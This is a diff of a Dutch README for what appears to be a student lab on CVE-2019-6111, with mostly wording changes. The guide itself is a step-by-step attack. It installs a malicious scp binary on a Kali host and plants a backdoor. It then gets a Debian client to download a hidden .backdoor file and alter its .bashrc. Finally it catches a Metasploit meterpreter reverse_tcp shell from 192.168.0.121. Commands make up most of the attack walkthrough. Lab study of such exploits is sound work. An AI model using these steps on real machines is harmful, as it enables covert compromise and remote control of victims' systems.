@@ -1,6 +1,6 @@
 # User Deployment Guide - CVE-2019-6111
 
-Deze deployment guide beschrijft alle nodige stappen die vereist zijn om de CVE-2019-6111 exploit uit te voeren, met als resultaat een reverse shell op de Debian client.
+Deze handleiding beschrijft alle vereiste stappen om de CVE-2019-6111-exploit uit te voeren en een reverse shell op de Debian-client tot stand te brengen.
 
 ## Inhoudsopgave
 
@@ -23,11 +23,11 @@ Deze deployment guide beschrijft alle nodige stappen die vereist zijn om de CVE-
 
 # Instellen Omgeving<a name="instellen-omgeving"></a>
 
-Om deze exploit te kunnen uitvoeren, moeten we eerst een omgeving opzetten. Hiervoor hebben we twee virtuele machines nodig: een Debian (Jessie) machine en een Kali Linux (Rolling) machine. De Debian machine zal de machine zijn die we willen aanvallen, en de Kali Linux machine zal de machine zijn die we gebruiken om de aanval uit te voeren.
+Om de exploit uit te voeren, moeten we eerst de omgeving configureren. Hiervoor hebben we twee virtuele machines nodig: een Debian (Jessie) machine en een Kali Linux (Rolling) machine. De Debian-machine zal het doelwit zijn van onze aanval, terwijl we de Kali Linux-machine gebruiken om de aanval uit te voeren.
 
 ## Debian (Jessie) Machine<a name="debian-jessie-machine"></a>
 
-Om deze virtuele machine te installeren, hebben we een script geschreven dat de installatie automatisch uitvoert. Dit script is te vinden in de map `src/debian` van deze repository. Om het script uit te voeren, moet je het volgende commando uitvoeren:
+Om deze virtuele machine te installeren, hebben we een script geschreven dat de installatie automatisch uitvoert. Het script is te vinden in de map `src/debian` van deze repository.
 
 ```console
 $ bash unattended_install.sh
@@ -41,7 +41,7 @@ PS1> .\unattended_install.ps1
 
 ## Kali Linux (Rolling) Machine<a name="kali-linux-rolling-machine"></a>
 
-Om deze virtuele machine te installeren, hebben we een script geschreven dat de installatie automatisch uitvoert. Dit script is te vinden in de map `src/kali` van deze repository. Om het script uit te voeren, moet je het volgende commando uitvoeren:
+Om deze virtuele machine te installeren, hebben we een script geschreven dat de installatie automatisch uitvoert. Het script is te vinden in de map `src/kali` van deze repository.
 
 ```console
 $ bash unattended_install.sh
@@ -53,32 +53,32 @@ of
 PS1> .\unattended_install.ps1
 ```
 
-Deze exploit vereist dat de Debian client een bestand naar keuze download van een "bad" scp server. De scp server is in dit geval de Kali virtual machine. Om van onze Kali server een "bad" scp server te maken, moeten we een custom `scp` binary installeren. Deze binary is te vinden in de map `src/kali/provision/golang/bin` van deze repository. Om deze binary te installeren, moet je het volgende commando uitvoeren:
+Deze exploit vereist dat de Debian-client een bestand van een "bad" scp-server downloadt. In dit geval is de Kali-virtuele machine de "slechte" scp-server. Om van onze Kali-machine een "bad" scp-server te maken, moeten we een aangepaste scp-binary installeren. Deze binary bevindt zich in de map `src/kali/provision/golang/bin` van deze repository.
 
-**Opmerking**: Het is belangrijk dat je dit commando uitvoert als root.
+**Opmerking**: Voer dit commando uit als root.
 
 ```console
 # git clone https://github.com/AntonVanAssche/CSV-NPE2223.git
 # cp -r CSV-NPE2223/src/kali/provision/golang/bin/bad_scp /usr/bin/scp
 ```
 
-Ook zal men de backdoor in de `/tmp` map moeten plaatsen. Deze backdoor is te vinden in de map `src/kali/provision/backdoor` van deze repository. Om deze backdoor te installeren, moet je het volgende commando uitvoeren:
+Daarna moeten we de backdoor in de `/tmp`-map plaatsen. Deze backdoor is te vinden in de map `src/kali/provision/backdoor` van deze repository.
 
-**Opmerking**: Het is belangrijk dat je dit commando uitvoert als root.
+**Opmerking**: Voer dit commando uit als root.
 
 ```console
 # cp -r CSV-NPE2223/src/kali/provision/backdoor /tmp/backdoor
 ```
 
-Deze backdoor is gelinkt aan het IP `192.168.0.121`, daarom moeten we de IP van de Kali machine aanpassen naar a.d.h.v. het `ip.sh` script in de map `src/kali/provision/`. Om dit script uit te voeren, moet je het volgende commando uitvoeren:
+Deze backdoor is gekoppeld aan het IP-adres `192.168.0.121`, dus we moeten het IP-adres van de Kali-machine aanpassen met behulp van het `ip.sh`-script in de map `src/kali/provision/`.
 
 ```console
-$ ./ip.sh
+$ bash ip.sh
 ```
 
-Als laatste stap moeten we de `ssh` server opstarten.
+Als laatste stap moeten we de `ssh`-server starten.
 
-**Opmerking**: Het is belangrijk dat je dit commando uitvoert als root.
+**Opmerking**: Voer dit commando uit als root.
 
 ```console
 # systemctl start ssh
@@ -88,31 +88,31 @@ Als laatste stap moeten we de `ssh` server opstarten.
 
 # CVE-2019-6111<a name="cve-2019-6111"></a>
 
-Het uitvoeren van de exploit is vrij eenvoudig. We moeten enkel een bestand downloaden van de "bad" scp server. Dit bestand kan eender welk bestand zijn. In dit voorbeeld gebruiken we het bestand `testfile.txt`. Om dit bestand te downloaden, moeten we het volgende commando uitvoeren:
+Het uitvoeren van de exploit is vrij eenvoudig. We moeten simpelweg een bestand downloaden van de "bad" scp-server. Dit bestand kan elk willekeurig bestand zijn. In dit voorbeeld gebruiken we het bestand `testfile.txt`.
 
 ```console
 $ scp 192.168.0.121:testfile.txt .
 ```
 
-Na het uitvoeren zal men zien dat er inderdaad een bestand genaamd `testfile.txt` is gedownload. Maar wanneer we `ls -a` doen zal men al snel zien dat er ook een bestand `.backdoor` is gedownload en de `.bashrc` file is aangepast.
+Na uitvoering van het commando zal het bestand `testfile.txt` worden gedownload. Als je echter het commando `ls -a` uitvoert, zul je merken dat er ook een bestand genaamd `.backdoor` is gedownload en dat het `.bashrc`-bestand is gewijzigd.
 
 # Metasploit<a name="metasploit"></a>
 
-Na dat de backdoor op de Debian client is gedownload, kunnen we een reverse shell opzetten. Hiervoor gebruiken we de Metasploit framework. Om de Metasploit framework te starten, moeten we het volgende commando uitvoeren:
+Nadat de backdoor op de Debian-client is geïnstalleerd, kunnen we een reverse shell opzetten met behulp van het Metasploit-framework.
 
-**Opmerking**: Het is belangrijk dat je dit commando uitvoert als root.
+**Opmerking**: Voer dit commando uit als root.
 
 ```console
-$ msfconsole -q -x "handler -p linux/aarch64/meterpreter/reverse_tcp -P 4444 -H 192.168.0.121"
+# msfconsole -q -x "handler -p linux/aarch64/meterpreter/reverse_tcp -P 4444 -H 192.168.0.121"
 ```
 
-Van zodra de gebruiker een nieuwe Bash shell opent, zal dit gedetecteerd worden door de Metasploit. Vervolgens kan men dan de sessie starten door het volgende commando uit te voeren:
+Zodra de gebruiker een nieuwe Bash-shell opent, wordt dit gedetecteerd door Metasploit.
 
 ```console
 msf6 > sessions 1
 ```
 
-Om een reverse shell op te zetten, moeten we dan simpeleweg het volgende commando uitvoeren:
+Om een reverse shell op te zetten, voeren we eenvoudigweg het volgende commando uit:
 
 ```console
 meterpreter > shell
